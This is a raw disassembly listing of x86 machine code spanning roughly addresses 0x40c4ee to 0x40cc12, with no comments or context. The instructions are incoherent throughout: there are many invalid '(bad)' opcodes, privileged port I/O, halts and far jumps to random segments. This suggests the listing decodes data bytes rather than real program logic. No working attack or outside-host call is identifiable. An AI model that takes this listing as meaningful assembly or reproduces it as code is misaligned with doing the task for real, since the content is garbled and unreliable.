  40c4ee:	mov    dl,0x60
  40c4f0:	adc    DWORD PTR [edx],edx
  40c4f2:	xchg   ebx,eax
  40c4f3:	stos   DWORD PTR es:[edi],eax
  40c4f4:	adc    bl,bh
  40c4f6:	iret   
  40c4f7:	adc    eax,0xe4e45cb6
  40c4fc:	or     eax,DWORD PTR [eax+0x7]
  40c4ff:	xlat   BYTE PTR ds:[ebx]
  40c500:	fild   DWORD PTR [ecx+0x6d]
  40c503:	add    al,0xf2
  40c505:	das    
  40c506:	jns    0x40c56d
  40c508:	inc    ebx
  40c509:	imul   esi,DWORD PTR [ebx+0xaa07fa3],0x97228d2e
  40c513:	stos   BYTE PTR es:[edi],al
  40c514:	pop    es
  40c515:	(bad)  
  40c516:	or     DWORD PTR [esi+0x50],0xe85fccd1
  40c51d:	lea    ebp,[ebp+0x55]
  40c520:	popf   
  40c521:	ficomp DWORD PTR [edi-0x42]
  40c524:	xchg   edi,eax
  40c525:	jmp    0xcf9c:0x13259a19
  40c52c:	cld    
  40c52d:	lods   al,BYTE PTR ds:[esi]
  40c52e:	and    al,0x4
  40c530:	and    al,0x2d
  40c532:	push   ebx
  40c533:	inc    ebp
  40c534:	jns    0x40c51f
  40c536:	call   0xb74f613e
  40c53b:	dec    esi
  40c53c:	cmp    ebx,0x885b3752
  40c542:	sub    ecx,esp
  40c544:	ret    
  40c545:	jle    0x40c4e0
  40c547:	cdq    
  40c548:	xchg   edx,eax
  40c549:	mov    edx,0xa8f6de43
  40c54e:	aas    
  40c54f:	push   ebp
  40c550:	imul   edx,DWORD PTR [esi-0x69],0x9b39b1b6
  40c557:	in     eax,0x86
  40c559:	add    al,BYTE PTR [ebx]
  40c55b:	adc    dl,BYTE PTR [edx+0x40f1da4d]
  40c561:	in     al,0x6b
  40c563:	cmp    eax,0x5c0e9f3b
  40c568:	jnp    0x40c4f6
  40c56a:	mov    ebx,0x23feeed2
  40c56f:	(bad)
  40c573:	xor    eax,DWORD PTR [ebx+edx*2-0x3c]
  40c577:	inc    esi
  40c578:	cmp    ch,dh
  40c57a:	jl     0x40c5db
  40c57c:	les    edi,FWORD PTR [edx+0x19]
  40c57f:	aad    0xab
  40c581:	repnz leave 
  40c583:	add    al,0xfb
  40c585:	adc    edi,edi
  40c587:	cmp    eax,esp
  40c589:	sub    cl,BYTE PTR [eax+0x19]
  40c58c:	clc    
  40c58d:	jmp    0x9cf068a3
  40c592:	rcr    BYTE PTR [ebp-0x68],0xf5
  40c596:	ins    DWORD PTR es:[edi],dx
  40c597:	dec    esi
  40c598:	sub    ch,BYTE PTR [ebx]
  40c59a:	add    DWORD PTR [esi+0x47],edi
  40c59d:	cmp    dh,bl
  40c59f:	mov    al,ds:0x33e97b64
  40c5a4:	push   ebx
  40c5a5:	cmc    
  40c5a6:	mov    ebx,0x2593d3ac
  40c5ab:	scas   al,BYTE PTR es:[edi]
  40c5ac:	lock push esp
  40c5ae:	pop    esp
  40c5af:	ss in  eax,0xe8
  40c5b2:	inc    edx
  40c5b3:	sbb    eax,0x9780536e
  40c5b8:	xchg   edx,edx
  40c5ba:	shl    DWORD PTR ds:[edx-0x37e7bd29],1
  40c5c1:	lea    edx,[ebx+0x63]
  40c5c4:	pop    eax
  40c5c5:	or     al,0xc9
  40c5c7:	mov    ds:0xf0ffca94,eax
  40c5cc:	hlt    
  40c5cd:	imul   DWORD PTR [ebx+0x7f]
  40c5d0:	dec    esp
  40c5d1:	jmp    0x8dfc:0xa4961f5a
  40c5d8:	xor    esp,DWORD PTR [ebp+0x31ce7d94]
  40c5de:	inc    ebx
  40c5df:	inc    ebx
  40c5e0:	out    dx,al
  40c5e1:	pusha  
  40c5e2:	notrack jmp DWORD PTR [edi]
  40c5e5:	add    bh,BYTE PTR [edi+0x65a96dfd]
  40c5eb:	jecxz  0x40c60b
  40c5ed:	mov    edi,0xb2203bda
  40c5f2:	(bad)  
  40c5f3:	cmp    ebx,DWORD PTR [ebx]
  40c5f5:	mov    dh,0x74
  40c5f7:	mov    esp,0x1ae7ab5c
  40c5fc:	or     esp,edx
  40c5fe:	mov    ah,BYTE PTR [ebx]
  40c600:	mov    al,0x3
  40c602:	pop    ebx
  40c603:	shr    BYTE PTR [ecx-0x5e],0xb8
  40c607:	jmp    FWORD PTR [ecx]
  40c609:	push   esi
  40c60a:	add    dl,BYTE PTR [esi]
  40c60c:	or     eax,0x6d59d122
  40c612:	mov    al,0xa3
  40c614:	sar    dh,cl
  40c616:	xchg   ecx,eax
  40c617:	fnstcw WORD PTR [esi-0x10]
  40c61a:	xchg   ecx,eax
  40c61b:	dec    ecx
  40c61c:	mov    al,cl
  40c61e:	mov    WORD PTR [eax+0x53],cs
  40c621:	sbb    cl,BYTE PTR [esi-0x199e6d05]
  40c627:	mov    BYTE PTR [esi],bl
  40c629:	dec    ebp
  40c62a:	dec    eax
  40c62b:	fisubr DWORD PTR [esi+0x75508b7f]
  40c631:	mov    ch,0x28
  40c633:	jl     0x40c5d7
  40c635:	bound  ebp,QWORD PTR [edi+0x66]
  40c638:	pop    es
  40c639:	sub    edi,ebx
  40c63b:	test   cl,ch
  40c63d:	jecxz  0x40c6ad
  40c63f:	icebp  
  40c640:	push   edx
  40c641:	push   0x15
  40c643:	test   DWORD PTR [esi+0xe241752],edx
  40c649:	pusha  
  40c64a:	xchg   esi,eax
  40c64b:	mov    ebx,0xa697f2c1
  40c650:	cmp    al,0xd4
  40c652:	or     eax,0xf096cf20
  40c657:	leave  
  40c658:	cmp    al,0x0
  40c65a:	imul   ebp,DWORD PTR [ebx+0x7ad2198c],0xe6948398
  40c664:	int    0x77
  40c666:	in     al,dx
  40c667:	xor    al,0xd4
  40c669:	mov    bl,0x81
  40c66b:	(bad)  
  40c66c:	sub    dl,BYTE PTR [edi-0x406b50b4]
  40c672:	pop    edi
  40c673:	lods   al,BYTE PTR ds:[esi]
  40c674:	mov    edx,0xb517722a
  40c679:	push   ds
  40c67a:	jae    0x40c5ff
  40c67c:	cmp    edx,esi
  40c67e:	jb     0x40c64b
  40c680:	outs   dx,BYTE PTR ds:[esi]
  40c681:	fcom   QWORD PTR [eax+ecx*1-0x5b]
  40c685:	and    eax,DWORD PTR [ebx]
  40c687:	jmp    0x89f6257e
  40c68c:	lods   al,BYTE PTR ds:[esi]
  40c68d:	jb     0x40c686
  40c68f:	and    dh,BYTE PTR [eax+0xa5857d2]
  40c695:	getsec 
  40c697:	mov    ch,0x32
  40c699:	push   ds
  40c69a:	sbb    ebp,DWORD PTR [edx-0x5]
  40c69d:	imul   edi,DWORD PTR [ebp+0x77bf2f92],0x8fecf149
  40c6a7:	aam    0x55
  40c6a9:	nop
  40c6aa:	push   edx
  40c6ab:	scas   al,BYTE PTR es:[edi]
  40c6ac:	ins    BYTE PTR es:[edi],dx
  40c6ad:	mov    bh,dh
  40c6af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6b0:	fs in  al,dx
  40c6b2:	in     al,dx
  40c6b3:	arpl   si,bx
  40c6b5:	mov    DWORD PTR [ebx-0x686dc72d],edx
  40c6bb:	lods   eax,DWORD PTR ds:[esi]
  40c6bc:	inc    ecx
  40c6bd:	mov    fs,WORD PTR [ebx-0x333d7250]
  40c6c3:	and    bl,ah
  40c6c5:	out    0xcd,eax
  40c6c7:	(bad)  
  40c6c8:	(bad)  
  40c6c9:	fwait
  40c6ca:	ret    
  40c6cb:	fwait
  40c6cc:	shl    BYTE PTR [edx+0x32978a53],1
  40c6d2:	out    dx,al
  40c6d3:	stos   BYTE PTR es:[edi],al
  40c6d4:	mov    al,0x23
  40c6d6:	leave  
  40c6d7:	xchg   edi,eax
  40c6d8:	jnp    0x40c6b7
  40c6da:	imul   ecx,DWORD PTR [edx+0x3307a8ab],0x77436580
  40c6e4:	cmp    al,0x54
  40c6e6:	mov    esi,0xd8d75eb
  40c6eb:	outs   dx,BYTE PTR ds:[esi]
  40c6ec:	push   edi
  40c6ed:	ja     0x40c70e
  40c6ef:	pop    esi
  40c6f0:	mov    BYTE PTR [ebx],dh
  40c6f2:	cs jnp 0x40c6bc
  40c6f5:	int3   
  40c6f6:	retf   
  40c6f7:	add    eax,0xdd34021e
  40c6fc:	xchg   esi,eax
  40c6fd:	xor    BYTE PTR [edi+0x6a],ah
  40c700:	sti    
  40c701:	leave  
  40c702:	jmp    0x40c72d
  40c704:	jecxz  0x40c695
  40c706:	pop    esi
  40c707:	sub    ecx,DWORD PTR [ebx-0x59750cec]
  40c70d:	mov    ecx,0x27f233fc
  40c712:	mov    ebp,0x3bf91de6
  40c717:	jmp    0x6aae7351
  40c71c:	popf   
  40c71d:	repnz (bad) 
  40c71f:	mov    es,WORD PTR [edx-0x78]
  40c722:	movq   mm7,mm2
  40c725:	add    DWORD PTR [ecx-0x62],ebp
  40c728:	js     0x40c6d3
  40c72a:	ins    BYTE PTR es:[edi],dx
  40c72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c72c:	push   ebx
  40c72d:	sub    BYTE PTR [esi],0x17
  40c730:	arpl   WORD PTR [ebx+edi*4-0x3b],sp
  40c734:	jns    0x40c704
  40c736:	xchg   ecx,eax
  40c737:	loopne 0x40c79e
  40c739:	pop    ebx
  40c73a:	rcl    bl,1
  40c73c:	pop    esp
  40c73d:	sub    al,0xd3
  40c73f:	lds    eax,FWORD PTR [ecx+0x6c]
  40c742:	add    al,0x22
  40c744:	xchg   edi,eax
  40c745:	inc    eax
  40c746:	fnstsw WORD PTR [edi-0x3]
  40c749:	push   ebp
  40c74a:	dec    ebx
  40c74b:	or     BYTE PTR [edx+0x2851350e],bl
  40c751:	mov    esi,0xed708c90
  40c756:	sbb    al,0xb6
  40c758:	int3   
  40c759:	mov    eax,ds:0x75380ad7
  40c75e:	pop    edx
  40c75f:	and    DWORD PTR [edi+0x2e],esi
  40c762:	dec    eax
  40c763:	adc    ah,dl
  40c765:	and    al,0x54
  40c767:	lahf   
  40c768:	sbb    edi,DWORD PTR [ebx]
  40c76a:	loopne 0x40c76f
  40c76c:	in     eax,0xfd
  40c76e:	cmp    DWORD PTR [eax+ebx*8-0x31],0x474b5bbc
  40c776:	ins    DWORD PTR es:[edi],dx
  40c777:	cmp    al,0x57
  40c779:	mov    bh,0xdc
  40c77b:	mov    ecx,0x7e15cdac
  40c780:	aad    0x56
  40c782:	data16 jmp 0x40c74c
  40c785:	or     eax,0x9cbdaeb
  40c78a:	repz inc edi
  40c78c:	sbb    DWORD PTR [edx],0x2d
  40c78f:	mov    ds:0x6ad3ebda,al
  40c794:	ret    
  40c795:	(bad)  
  40c796:	cmp    BYTE PTR [edi],ah
  40c798:	cmc    
  40c799:	or     eax,0x37fe6e13
  40c79e:	daa    
  40c79f:	in     eax,0xb7
  40c7a1:	add    esi,DWORD PTR [ecx-0x31]
  40c7a4:	addr16 loop 0x40c7ef
  40c7a7:	push   ds
  40c7a8:	stos   DWORD PTR es:[edi],eax
  40c7a9:	scas   eax,DWORD PTR es:[edi]
  40c7aa:	cmp    BYTE PTR [ecx],ch
  40c7ac:	push   edi
  40c7ad:	into   
  40c7ae:	fiadd  WORD PTR [esi]
  40c7b0:	jmp    0x299b:0xdd0224f5
  40c7b7:	xchg   ecx,eax
  40c7b8:	adc    DWORD PTR [ecx+ebx*4+0x47],ecx
  40c7bc:	and    eax,0xa148e561
  40c7c1:	fwait
  40c7c2:	mov    WORD PTR [ebx-0x73248a04],gs
  40c7c8:	sub    eax,0xb10dfe27
  40c7cd:	jle    0x40c7a6
  40c7cf:	xchg   ebp,eax
  40c7d0:	mov    dh,0xba
  40c7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d3:	fstp   st(6)
  40c7d5:	dec    ecx
  40c7d6:	mov    ds:0xb1f2b64e,al
  40c7db:	cmp    ch,BYTE PTR ds:0x9ca16414
  40c7e1:	lea    esp,[edx]
  40c7e3:	aaa    
  40c7e4:	sub    al,0x57
  40c7e6:	ret    0xb4d4
  40c7e9:	jmp    0x8518:0x136a87bb
  40c7f0:	mov    bh,0x61
  40c7f2:	adc    BYTE PTR [ebp+0x77],dl
  40c7f5:	call   0x3463:0xeaff48c0
  40c7fc:	cmp    al,0x67
  40c7fe:	mov    eax,0x3fdf86a8
  40c803:	cli    
  40c804:	aas    
  40c805:	in     al,dx
  40c806:	cmp    edi,DWORD PTR [esi]
  40c808:	aas    
  40c809:	dec    ecx
  40c80a:	int    0xd7
  40c80c:	fsub   DWORD PTR [ebx-0x53c7b8e8]
  40c812:	xor    WORD PTR [ecx-0x58],di
  40c816:	jmp    FWORD PTR [edi+0x53]
  40c819:	mov    ebx,0x7f5ee270
  40c81e:	stos   WORD PTR es:[edi],ax
  40c820:	ins    DWORD PTR es:[edi],dx
  40c821:	imul   eax,DWORD PTR [edi],0x26
  40c824:	pop    ss
  40c825:	pop    edx
  40c826:	xor    al,0x9c
  40c828:	push   0xffffff8b
  40c82a:	pop    ebx
  40c82b:	mov    edi,0x5ab0f503
  40c830:	ffree  st(0)
  40c832:	jnp    0x40c821
  40c834:	jne    0x40c800
  40c836:	mov    edx,edi
  40c838:	call   FWORD PTR [eax]
  40c83a:	push   esi
  40c83b:	(bad)  
  40c83c:	outs   dx,DWORD PTR ds:[esi]
  40c83d:	and    eax,0x651628a1
  40c842:	mov    bh,0x3
  40c844:	xchg   esi,eax
  40c845:	out    0xdf,eax
  40c847:	xor    ebp,0xffffffc9
  40c84a:	dec    ecx
  40c84b:	fild   QWORD PTR [edi]
  40c84d:	and    BYTE PTR [esi+0x56],ah
  40c850:	jecxz  0x40c82e
  40c852:	(bad)  
  40c853:	mov    esp,0x892719d9
  40c858:	jae    0x40c8d5
  40c85a:	and    al,0x8d
  40c85c:	mov    esi,DWORD PTR [ecx+0x641755b1]
  40c862:	dec    BYTE PTR [edi-0x24647f4a]
  40c868:	fmul   st,st(7)
  40c86a:	clc    
  40c86b:	out    0x50,eax
  40c86d:	xchg   ebp,eax
  40c86e:	out    0xf1,al
  40c870:	jns    0x40c89c
  40c872:	lds    eax,FWORD PTR [eax+0x7e5917b3]
  40c878:	jb     0x40c88c
  40c87a:	in     eax,0x8
  40c87c:	mov    ds:0x30bce3a0,al
  40c881:	pop    edx
  40c882:	and    BYTE PTR [edx+0x2320868],ah
  40c888:	jge    0x40c88d
  40c88a:	inc    ebx
  40c88b:	fld    TBYTE PTR [eax+esi*8]
  40c88e:	cld    
  40c88f:	in     eax,dx
  40c890:	test   BYTE PTR ds:0x57050a56,cl
  40c896:	scas   eax,DWORD PTR es:[edi]
  40c897:	leave  
  40c898:	xchg   edx,eax
  40c899:	add    al,0x36
  40c89b:	jge    0x40c866
  40c89d:	sar    ebp,0x93
  40c8a0:	or     ch,bh
  40c8a2:	xlat   BYTE PTR ds:[ebx]
  40c8a3:	setg   BYTE PTR [ebp+0x297a5332]
  40c8aa:	jns    0x40c8f0
  40c8ac:	sub    BYTE PTR [eax+0x33],ch
  40c8af:	push   esp
  40c8b0:	cmc    
  40c8b1:	std    
  40c8b2:	push   ebx
  40c8b3:	mov    eax,ds:0x8c55f061
  40c8b8:	xchg   ecx,eax
  40c8b9:	lods   al,BYTE PTR ds:[esi]
  40c8ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8bb:	and    dh,BYTE PTR [esi+0x78991df8]
  40c8c1:	hlt    
  40c8c2:	fwait
  40c8c3:	cmp    BYTE PTR [eax+0x70],al
  40c8c6:	pop    eax
  40c8c7:	in     al,dx
  40c8c8:	xor    ebx,ebp
  40c8ca:	jmp    0x22ad25cd
  40c8cf:	push   ebp
  40c8d0:	xchg   esp,eax
  40c8d1:	adc    eax,0xb5117968
  40c8d6:	cmp    bl,BYTE PTR [edi+0x5aa8653e]
  40c8dc:	aam    0xc2
  40c8de:	and    DWORD PTR [ebx],esi
  40c8e0:	pop    esi
  40c8e1:	adc    bl,bh
  40c8e3:	pop    edx
  40c8e4:	mov    esp,0x97ad9bed
  40c8e9:	inc    edi
  40c8ea:	sub    BYTE PTR cs:[edx+0x4a],al
  40c8ee:	push   eax
  40c8ef:	aas    
  40c8f0:	mov    eax,ds:0x19e119bc
  40c8f5:	ret    
  40c8f6:	and    eax,0x61157f8e
  40c8fb:	data16 fnstsw WORD PTR [eax]
  40c8fe:	cmp    dh,0x57
  40c901:	mov    esi,DWORD PTR [eax-0x1a]
  40c904:	dec    edx
  40c905:	in     eax,dx
  40c906:	shr    BYTE PTR [esi-0x3439476],cl
  40c90c:	mov    ah,0xcc
  40c90e:	js     0x40c921
  40c910:	sbb    ecx,esp
  40c912:	or     cl,cl
  40c914:	outs   dx,BYTE PTR ds:[esi]
  40c915:	mov    DWORD PTR [eax-0xf],ecx
  40c918:	inc    esp
  40c919:	sub    cl,BYTE PTR [esi+esi*4+0x26]
  40c91d:	cmc    
  40c91e:	outs   dx,DWORD PTR ds:[esi]
  40c91f:	mov    al,ds:0x2ef26d9d
  40c924:	int    0x7d
  40c926:	jg     0x40c91b
  40c928:	sbb    ah,BYTE PTR [ebp-0x62ae1f11]
  40c92e:	pop    ecx
  40c92f:	dec    esi
  40c930:	stos   DWORD PTR es:[edi],eax
  40c931:	mov    al,ds:0x6ce3c6db
  40c936:	mov    eax,DWORD PTR [eax-0x3a]
  40c939:	mov    esp,0xf4e2ae04
  40c93e:	pushf  
  40c93f:	je     0x40c8cd
  40c941:	jo     0x40c94f
  40c943:	jno    0x40c8fd
  40c945:	les    ebx,FWORD PTR [eax+ebp*4+0x63]
  40c949:	sbb    edi,ebp
  40c94b:	and    eax,0xd61332d9
  40c950:	in     al,dx
  40c951:	stos   DWORD PTR es:[edi],eax
  40c952:	push   0x5423dfcf
  40c957:	inc    edx
  40c958:	jg     0x40c996
  40c95a:	add    dh,BYTE PTR [esi]
  40c95c:	cdq    
  40c95d:	xor    al,0x24
  40c95f:	inc    ebp
  40c960:	ror    BYTE PTR [edx-0x6ed451d3],1
  40c966:	push   DWORD PTR [ecx+0x22]
  40c969:	fcomp  QWORD PTR [ecx+ebx*8]
  40c96c:	sbb    DWORD PTR ds:0xdad42306,eax
  40c972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c973:	lock mov edx,0x72a8c5ec
  40c979:	xor    ch,0x5c
  40c97c:	retf   0xe5fe
  40c97f:	iret   
  40c980:	in     al,0x22
  40c982:	(bad)  
  40c983:	repnz mov ds:0x3d600d12,al
  40c989:	dec    ebx
  40c98a:	sbb    al,0xc2
  40c98c:	mov    WORD PTR [esi+0x1a],?
  40c98f:	pop    eax
  40c990:	imul   eax,edx,0xeb4f54d1
  40c996:	dec    ebp
  40c997:	mov    DWORD PTR [ebx-0x76],eax
  40c99a:	test   edi,edx
  40c99c:	mov    eax,ebx
  40c99e:	or     al,0x1e
  40c9a0:	addr16 mov ecx,0xefcbc930
  40c9a6:	mov    bh,0xf9
  40c9a8:	sbb    al,0x7b
  40c9aa:	pop    esi
  40c9ab:	enter  0xf0b8,0xc8
  40c9af:	lea    edx,[esi+0x54]
  40c9b2:	rol    DWORD PTR [edx],1
  40c9b4:	xchg   esp,eax
  40c9b5:	push   ss
  40c9b6:	ds das 
  40c9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9b9:	hlt    
  40c9ba:	ja     0x40c964
  40c9bc:	xor    ebx,esp
  40c9be:	sub    eax,0x37e89ee4
  40c9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c4:	jno    0x40c947
  40c9c6:	mov    edx,0x485397ff
  40c9cb:	inc    edx
  40c9cc:	scas   al,BYTE PTR es:[edi]
  40c9cd:	jmp    0x40ca2b
  40c9cf:	sbb    al,0xd0
  40c9d1:	pop    ss
  40c9d2:	xor    al,0x14
  40c9d4:	cli    
  40c9d5:	push   ebp
  40c9d6:	push   ebp
  40c9d7:	pop    ebx
  40c9d8:	pop    ds
  40c9d9:	out    0x65,al
  40c9db:	sar    al,1
  40c9dd:	cmp    bh,BYTE PTR [edx-0x29]
  40c9e0:	mov    DWORD PTR [esi-0x7c6c281c],esi
  40c9e6:	test   DWORD PTR [edx],ebp
  40c9e8:	in     al,dx
  40c9e9:	lods   eax,DWORD PTR ds:[esi]
  40c9ea:	xchg   ecx,eax
  40c9eb:	mov    esi,0x13e420ac
  40c9f0:	int3   
  40c9f1:	aas    
  40c9f2:	pop    es
  40c9f3:	dec    eax
  40c9f4:	mov    bh,0x11
  40c9f6:	int3   
  40c9f7:	out    0x1,al
  40c9f9:	mov    edx,0x3676f93d
  40c9fe:	shr    DWORD PTR [ebp+0x50],1
  40ca01:	dec    esp
  40ca02:	das    
  40ca03:	fisub  WORD PTR [eax+ebx*8]
  40ca06:	or     cl,BYTE PTR [ebx]
  40ca08:	and    ch,BYTE PTR [ecx]
  40ca0a:	fldcw  WORD PTR [edx]
  40ca0c:	ret    0x623c
  40ca0f:	add    dh,ch
  40ca11:	fs pop es
  40ca13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca14:	shl    bh,cl
  40ca16:	and    eax,0xe61e2bb3
  40ca1b:	ret    
  40ca1c:	xor    DWORD PTR [ecx-0x451ea5dd],ebx
  40ca22:	iret   
  40ca23:	xor    BYTE PTR [ecx-0x49a25dd],dl
  40ca29:	pop    es
  40ca2a:	and    BYTE PTR [edx],0x72
  40ca2d:	pop    esi
  40ca2e:	lods   eax,DWORD PTR ds:[esi]
  40ca2f:	popf   
  40ca30:	fcmovbe st,st(0)
  40ca32:	pop    edi
  40ca33:	dec    ebx
  40ca34:	adc    al,0x55
  40ca36:	fimul  DWORD PTR [ebp-0x5b01e4ef]
  40ca3c:	inc    edi
  40ca3d:	outs   dx,BYTE PTR ds:[esi]
  40ca3e:	push   edi
  40ca3f:	ja     0x40c9e7
  40ca41:	adc    eax,0xce5e2877
  40ca46:	sbb    al,0x9b
  40ca48:	mov    esi,0x92454f57
  40ca4d:	ss inc ebp
  40ca4f:	adc    eax,0x6168a96d
  40ca54:	and    ch,BYTE PTR [ebx]
  40ca56:	fsub   QWORD PTR [edi]
  40ca58:	xor    bl,ah
  40ca5a:	ins    DWORD PTR es:[edi],dx
  40ca5b:	mov    edx,?
  40ca5d:	(bad)  
  40ca5e:	lds    esp,FWORD PTR [ebx+0x27]
  40ca61:	pushf  
  40ca62:	cs popf 
  40ca64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca65:	xor    al,0xbc
  40ca67:	fidivr WORD PTR [ecx+eiz*4+0x5f]
  40ca6b:	xchg   esp,eax
  40ca6c:	hlt    
  40ca6d:	mov    esi,DWORD PTR [ebp+ecx*4-0x6d]
  40ca71:	jl     0x40ca7e
  40ca73:	mov    eax,ds:0x532de646
  40ca78:	xor    DWORD PTR [esi+0x148b5a18],ebp
  40ca7e:	xchg   edx,eax
  40ca7f:	les    edi,FWORD PTR [eax+0x4d]
  40ca82:	das    
  40ca83:	cmp    BYTE PTR [edx],cl
  40ca85:	dec    edi
  40ca86:	xchg   edx,eax
  40ca87:	add    BYTE PTR [esi+edi*4+0x93f3d34],bh
  40ca8e:	lods   eax,DWORD PTR ds:[esi]
  40ca8f:	sbb    al,0xa9
  40ca91:	mov    dh,BYTE PTR [edx]
  40ca93:	push   ds
  40ca94:	scas   eax,DWORD PTR es:[edi]
  40ca95:	out    0x96,eax
  40ca97:	dec    edi
  40ca98:	shr    DWORD PTR [edx+0x2f],cl
  40ca9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca9c:	add    DWORD PTR [ecx+0x36d41894],esp
  40caa2:	xchg   ecx,eax
  40caa3:	jbe    0x40caac
  40caa5:	jmp    0x9d73:0x4ece4a1a
  40caac:	(bad)  
  40caad:	shr    ebx,cl
  40caaf:	hlt    
  40cab0:	std    
  40cab1:	mov    al,ds:0xa386c80f
  40cab6:	push   0x2
  40cab8:	dec    ebx
  40cab9:	push   es
  40caba:	in     al,0x6b
  40cabc:	xor    DWORD PTR [edi+0x34],edi
  40cabf:	out    0xff,eax
  40cac1:	aam    0xaf
  40cac3:	cmp    BYTE PTR [ebp+0x4c],al
  40cac6:	in     eax,dx
  40cac7:	ins    BYTE PTR es:[edi],dx
  40cac8:	sub    DWORD PTR [eax-0x77],esp
  40cacb:	ror    BYTE PTR [eax+0x5a03d727],1
  40cad1:	es es add al,0xf3
  40cad5:	clc    
  40cad6:	lods   eax,DWORD PTR ds:[esi]
  40cad7:	pop    esp
  40cad8:	movzx  ecx,BYTE PTR ss:[eax]
  40cadc:	aam    0x62
  40cade:	popa   
  40cadf:	out    dx,eax
  40cae0:	mov    ebp,0xb702f384
  40cae5:	dec    ebx
  40cae6:	dec    edi
  40cae7:	adc    al,0xc2
  40cae9:	mov    ds:0x28d08dd8,al
  40caee:	inc    esi
  40caef:	push   es
  40caf0:	(bad)  
  40caf1:	clc    
  40caf2:	xor    DWORD PTR [edi-0x1d0bc16d],eax
  40caf8:	xchg   BYTE PTR es:[edi-0x765e0929],bl
  40caff:	lea    ebp,[esi-0x45c29ed6]
  40cb05:	pop    esp
  40cb06:	dec    edx
  40cb07:	rcl    bl,1
  40cb09:	xlat   BYTE PTR ds:[ebx]
  40cb0a:	leave  
  40cb0b:	arpl   WORD PTR [esi-0x2fe3fcc4],sp
  40cb11:	push   edi
  40cb12:	scas   eax,DWORD PTR es:[edi]
  40cb13:	dec    ebp
  40cb14:	imul   ebx,DWORD PTR [ebp+0x138654ec],0x0
  40cb1b:	xchg   DWORD PTR [ebp+ebp*2+0x6],ebp
  40cb1f:	add    al,0x6e
  40cb21:	xor    BYTE PTR [esi],ch
  40cb23:	pusha  
  40cb24:	fadd   DWORD PTR [ebp+0x7556fbf8]
  40cb2a:	jae    0x40caf4
  40cb2c:	bound  ebx,QWORD PTR [ecx-0x48]
  40cb2f:	in     eax,dx
  40cb30:	sub    al,0xbd
  40cb32:	mov    esp,DWORD PTR [esi-0x31921116]
  40cb38:	test   DWORD PTR [esi],ecx
  40cb3a:	inc    eax
  40cb3b:	xchg   DWORD PTR [ebx-0x16665725],ecx
  40cb41:	mov    al,0xc1
  40cb43:	rcl    BYTE PTR [ecx],cl
  40cb45:	xor    BYTE PTR [esi],bh
  40cb47:	es das 
  40cb49:	not    dh
  40cb4b:	dec    DWORD PTR [ecx]
  40cb4d:	xor    DWORD PTR [ebx-0x5c872736],esp
  40cb53:	out    0x82,eax
  40cb55:	cmp    edi,DWORD PTR [edi-0x5d7f307]
  40cb5b:	jbe    0x40cbd2
  40cb5d:	in     eax,0xd5
  40cb5f:	in     al,0x69
  40cb61:	lds    ebp,FWORD PTR [eax-0x4980205a]
  40cb67:	(bad)  
  40cb68:	jnp    0x40cb87
  40cb6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb6b:	not    WORD PTR [eax]
  40cb6e:	sahf   
  40cb6f:	outs   dx,DWORD PTR ds:[esi]
  40cb70:	jno    0x40cb50
  40cb72:	adc    al,0x4a
  40cb74:	sbb    esi,DWORD PTR [ecx]
  40cb76:	cs repz in al,0x78
  40cb7a:	fist   WORD PTR [edi+0x77]
  40cb7d:	cmp    ebx,esi
  40cb7f:	inc    esi
  40cb80:	imul   esp,DWORD PTR [edx-0x519ca71],0xffffffe8
  40cb87:	mov    dh,0x7f
  40cb89:	xchg   bh,bl
  40cb8b:	ins    DWORD PTR es:[edi],dx
  40cb8c:	scas   eax,DWORD PTR es:[edi]
  40cb8d:	and    DWORD PTR ds:0xc3fb7c58,esp
  40cb93:	arpl   bx,bp
  40cb95:	iret   
  40cb96:	or     BYTE PTR [ebp+0x2e2cbec7],al
  40cb9c:	pop    es
  40cb9d:	adc    ebx,eax
  40cb9f:	mov    DWORD PTR [ebx],0xe4806aef
  40cba5:	sub    eax,0x68d8e8b
  40cbaa:	cmp    al,0xd3
  40cbac:	dec    esp
  40cbad:	sub    ch,0xfa
  40cbb0:	mov    eax,0x2f86a65f
  40cbb5:	out    0xb5,al
  40cbb7:	imul   esi,ebp,0xffffffb4
  40cbba:	push   cs
  40cbbb:	inc    ebx
  40cbbc:	outs   dx,BYTE PTR ds:[esi]
  40cbbd:	aad    0x42
  40cbbf:	inc    ecx
  40cbc0:	fwait
  40cbc1:	pusha  
  40cbc2:	push   es
  40cbc3:	sub    eax,0x2dbaf2d5
  40cbc8:	inc    ecx
  40cbc9:	sahf   
  40cbca:	and    DWORD PTR [ebx],edx
  40cbcc:	jne    0x40cb6f
  40cbce:	cdq    
  40cbcf:	cmp    ebp,ecx
  40cbd1:	loopne 0x40cb68
  40cbd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbd4:	test   BYTE PTR [ecx+0x42bdc8f],0xed
  40cbdb:	sbb    ecx,DWORD PTR [edx+0x46]
  40cbde:	in     eax,0xe6
  40cbe0:	sbb    al,BYTE PTR [ebx-0x39]
  40cbe3:	and    esi,DWORD PTR [edi-0x67a6f8f4]
  40cbe9:	adc    BYTE PTR [ebx-0x10271643],cl
  40cbef:	and    ebp,edx
  40cbf1:	add    eax,0x1647717f
  40cbf6:	pop    es
  40cbf7:	push   eax
  40cbf8:	adc    ebx,eax
  40cbfa:	sbb    BYTE PTR [esi],al
  40cbfc:	cmp    eax,0xc125061d
  40cc01:	dec    edi
  40cc02:	inc    eax
  40cc03:	adc    esi,DWORD PTR [ecx+0xf0b6ec2]
  40cc09:	pop    ebp
  40cc0a:	lods   al,BYTE PTR ds:[esi]
  40cc0b:	lods   al,BYTE PTR ds:[esi]
  40cc0c:	ja     0x40cbdf
  40cc0e:	sbb    ebp,DWORD PTR [ebx-0x1a]
  40cc11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc12:	sub    eax,0x6f433b4d
